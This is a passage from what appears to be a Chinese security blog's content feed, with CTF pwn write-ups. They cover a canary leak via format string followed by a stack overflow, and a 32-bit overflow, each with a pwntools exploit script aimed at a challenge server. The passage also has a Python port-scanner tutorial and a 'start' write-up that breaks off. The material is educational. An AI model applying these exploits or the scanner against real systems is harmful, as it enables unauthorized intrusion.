__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_4008EB();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      sub_400960();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4009DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Format String Bug &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;3. Exit the battle &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化字符串漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区溢出漏洞</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入v3=1，跳转到缓冲区溢出漏洞，如果不存在canary保护机制，则可以直接覆盖返回地址跳转到system函数。</p>
+<p>输入v3=2，跳转到格式化字符串漏洞，可以打印出栈上Canary，之后利用缓冲区溢出覆盖即可。</p>
+<p>输入v3=3，退出程序</p>
+<h3 id="绕过Canary机制"><a href="#绕过Canary机制" class="headerlink" title="绕过Canary机制"></a>绕过Canary机制</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/3.png" class></strong></p>
+<p>看一下流程图和汇编可以知道readsqword这个地方有canary保护，只有 rax 和fs：28h 两个值相等的时候  才能跳转到返回值，反之则调用stack_chk_fail。</p>
+<p>根据程序可以看出，v2应该就是canary的值，一开始，将_readfsqword(0x28u)的值给v2，后来又和v2做异或操作，只有v2与它还相等，程序返回0，否则返回不为零的数。</p>
+<h3 id="泄露v2（Canary）的值"><a href="#泄露v2（Canary）的值" class="headerlink" title="泄露v2（Canary）的值"></a>泄露v2（Canary）的值</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/6.png" class></strong></p>
+<p>程序中<a href="https://xz.aliyun.com/t/7398">格式化字符串漏洞</a>为</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);  </span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure>
+
+<p>程序将输入的<code>AAAA</code>存入buf中，之后格式化字符串打印出了其对应的ASCII码，因此可以计算出格式化字符串中<code>&amp;buf</code>的偏移量，即<code>&amp;buf</code>在第6个参数的位置。</p>
+<p>根据IDA的注释，我们知道buf在<code>rbp-90h</code>，v2在<code>rbp-8h</code>，canary与我们输入参数的偏移为<code>0x90 - 0x8 = 0x88</code>，然后八个字节为一组，<code>0x88 / 8 = 17</code>，因此Canary即v2在格式化字符串的第<code>17 + 6 = 23</code>参数的位置。</p>
+<blockquote>
+<p>基本的格式化字符串参数</p>
+<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%​$hn或%$hhn来适时调整。</p>
+<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+</blockquote>
+<p>注意%p、%x会直接打印栈上存储的值，而%s会打印栈上存储值所指向地址的值。</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p>payload的构造：覆盖返回地址，需要0x90-0x8=0x88覆盖局部变量，然后放上canary的值，在填充8个“a”覆盖ebp（64位程序），最后加上system的返回地址。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49747</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">print(canary)</span><br><span class="line"> </span><br><span class="line">flag_addr = <span class="number">0x4008da</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;deafbeef&#x27;</span> + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/5.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>AD_World</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>Stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python实现端口扫描器</title>
+    <url>/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/0.png" class></strong></p>
+ <a id="more"></a>
+
+<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。$–&gt;$（<a href="https://xz.aliyun.com/t/5376#toc-0">端口扫描类型</a>）</p>
+<p>还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。</p>
+<p>实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。$–&gt;$（<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71">socket编程基础</a>）</p>
+<h3 id="实现单线程扫描功能"><a href="#实现单线程扫描功能" class="headerlink" title="实现单线程扫描功能"></a>实现单线程扫描功能</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现从程序外部向程序传递参数</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">portstrs = sys.argv[<span class="number">2</span>].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描端口范围</span></span><br><span class="line">start_port = int(portstrs[<span class="number">0</span>])</span><br><span class="line">end_port = int(portstrs[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标ip地址</span></span><br><span class="line">target_ip = gethostbyname(host)</span><br><span class="line">opened_ports = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行循环连接</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port):</span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    result = sock.connect_ex((target_ip, port))</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        opened_ports.append(port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印开放的端口</span></span><br><span class="line">print(<span class="string">&quot;Opened ports:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opened_ports:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/2.png" class></strong></p>
+<p>上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。</p>
+<h3 id="多线程扫描"><a href="#多线程扫描" class="headerlink" title="多线程扫描"></a>多线程扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> gevent.pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TCP_connect</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot;</span></span><br><span class="line">    TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCP_sock.settimeout(<span class="number">0.5</span>)  <span class="comment"># 设置连接超时</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = TCP_sock.connect_ex((ip, int(port)))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]%s 端口 开启\t&quot;</span> % port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[!]%s端口 关闭&quot;%port)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        TCP_sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_ip</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标IP&quot;&quot;&quot;</span></span><br><span class="line">    ip = input(<span class="string">&quot;[+]输入扫描目标IP:&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*]正在扫描&quot;</span>)</span><br><span class="line">    scan_port(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_web</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标网址&quot;&quot;&quot;</span></span><br><span class="line">    web = input(<span class="string">&quot;[+]输入扫描网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">in</span> web <span class="keyword">or</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">in</span> web:</span><br><span class="line">        web = web[web.find(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">        print(web)</span><br><span class="line">        print(<span class="string">&quot;[*]正在分析网站服务器IP&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_ip = socket.gethostbyname(str(web))</span><br><span class="line">        print(<span class="string">&quot;[*]服务器IP为%s&quot;</span> % server_ip)</span><br><span class="line">        scan_port(server_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]服务器IP获取失败&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*]开始扫描目标端口&quot;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    g = gevent.pool.Pool(<span class="number">50</span>)  <span class="comment"># 设置线程数</span></span><br><span class="line">    run_list = []</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">        run_list.append(g.spawn(TCP_connect, ip, port))</span><br><span class="line">    gevent.joinall(run_list)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[*]总耗时%s&quot;</span> % time.strftime(<span class="string">&quot;%H:%M:%S&quot;</span>, time.gmtime(end - start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;1.通过IP扫描端口&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2.通过网址扫描端口&quot;</span>)</span><br><span class="line">    uc = int(input(<span class="string">&quot;[+]请输入选择:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == uc:</span><br><span class="line">        scan_ip()</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> == uc:</span><br><span class="line">        scan_web()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]输入有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>这里展示部分运行结果：</p>
+<h4 id="选择通过网址扫描端口"><a href="#选择通过网址扫描端口" class="headerlink" title="选择通过网址扫描端口"></a>选择通过网址扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/3.png" class></strong></p>
+<h4 id="选择通过IP扫描端口"><a href="#选择通过IP扫描端口" class="headerlink" title="选择通过IP扫描端口"></a>选择通过IP扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/4.png" class></strong></p>
+<h3 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.56.1&#x27;</span></span><br><span class="line"><span class="comment"># 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误</span></span><br><span class="line">nm = nmap.PortScanner(nmap_search_path=(<span class="string">&#x27;nmap&#x27;</span>, <span class="string">r&quot;E:\nmap\nmap.exe&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">130</span>, <span class="number">136</span>):</span><br><span class="line">    result = nm.scan(host, str(port))</span><br><span class="line">    <span class="comment"># 在主机192.168.56.1上获取端口22/tcp状态</span></span><br><span class="line">    state = result[<span class="string">&#x27;scan&#x27;</span>][<span class="string">&#x27;192.168.56.1&#x27;</span>][<span class="string">&#x27;tcp&#x27;</span>][int(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;[%s] port state: %s&#x27;</span> % (port, state))</span><br></pre></td></tr></table></figure>
+
+<p>使用<strong>netstat -an</strong>查看本机开启的端口服务，用端口135测试代码运行的正确性</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/1.png" class></strong></p>
+<p>也可以直接使用zenmap工具进行端口扫描：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/5.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>forgot</title>
+    <url>/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/6.png" class></strong></p>
+<h3 id="检查文件开启的保护措施"><a href="#检查文件开启的保护措施" class="headerlink" title="检查文件开启的保护措施"></a>检查文件开启的保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/1.png" class></strong></p>
+<h3 id="用IDA32打开"><a href="#用IDA32打开" class="headerlink" title="用IDA32打开"></a>用IDA32打开</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/2.png" class></strong></p>
+<p>**__isoc99_scanf()**函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。</p>
+<h3 id="shift-F12查看字符串"><a href="#shift-F12查看字符串" class="headerlink" title="shift+F12查看字符串"></a>shift+F12查看字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/3.png" class></strong></p>
+<p>找到其调用函数的位置</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/4.png" class></strong></p>
+<p>查看sub_80486CC函数所在地址（这里函数名称就对应其地址）</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/5.png" class></strong></p>
+<p>其函数所在地址0x080486CC，注意这里调用system函数需要传递<strong>cat flag</strong>参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/7.png" class></strong></p>
+<p>v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/8.png" class></strong></p>
+<p>即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/9.png" class></strong></p>
+<p>查看其ASCII码对应的字符为：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/10.png" class></strong></p>
+<p>若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52435</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line">payload = <span class="string">&#x27;/&#x27;</span>*(<span class="number">0x74</span><span class="number">-0x54</span>)+ p32(cat_flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/11.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>AD_World</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>Stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>start</title>
+    <url>/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/1.png" class></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/2.png" class></strong></p>
+<p><strong>RELRO(Relocation Read Only)：尽量使存储区域只读</strong></p>
+<h3 id="IDA32查看文件"><a href="#IDA32查看文件" class="headerlink" title="IDA32查看文件"></a>IDA32查看文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">3</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其对应的汇编代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">保存现场环境esp、_exit</span><br><span class="line">.text:<span class="number">08048060</span>                 push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line"></span><br><span class="line">清空寄存器EAX EBX ECX EDX</span><br><span class="line">.text:<span class="number">08048066</span>                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line"></span><br><span class="line">向栈上压入参数</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h    CTF:</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h    the</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h    art</span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h    s st</span><br><span class="line">.text:<span class="number">08048082</span>                 push    <span class="number">2774654</span>Ch    Let’</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048087</span>                 mov     ecx, esp        ; addr</span><br><span class="line">.text:<span class="number">08048089</span>                 mov     dl, <span class="number">14</span>h         ; len</span><br><span class="line">.text:<span class="number">0804808B</span>                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:<span class="number">0804808</span>D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804808F</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_write</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048091</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">08048093</span>                 mov     dl, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX -</span><br><span class="line"></span><br><span class="line">恢复栈平衡，返回到_exit</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br><span class="line">.text:<span class="number">0804809</span>C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+
+<p>函数结构很简单，采用<code>int 80</code>调用了两个系统调用，下面先补充<code>int 80</code>系统调用的细节：</p>
+<blockquote>
